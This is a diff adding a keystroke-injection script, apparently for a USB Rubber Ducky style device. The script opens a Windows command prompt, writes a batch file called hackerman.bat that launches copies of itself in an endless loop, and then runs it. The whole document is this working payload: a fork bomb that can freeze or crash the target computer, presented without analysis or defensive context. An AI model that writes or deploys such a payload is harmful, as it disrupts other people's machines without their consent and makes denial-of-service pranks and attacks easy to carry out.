@@ -1,0 +1,23 @@
+DELAY 1000
+GUI x 
+STRING c
+DELAY 1000
+STRING copy con hackerman.bat
+ENTER
+STRING @echo off 
+ENTER 
+STRING color a 
+ENTER
+STRING :a
+ENTER
+STRING start hackerman.bat
+ENTER 
+STRING dir
+ENTER
+STRING goto a
+ENTER 
+CONTROL z 
+ENTER 
+DELAY 250
+STRING hackerman.bat
+ENTER
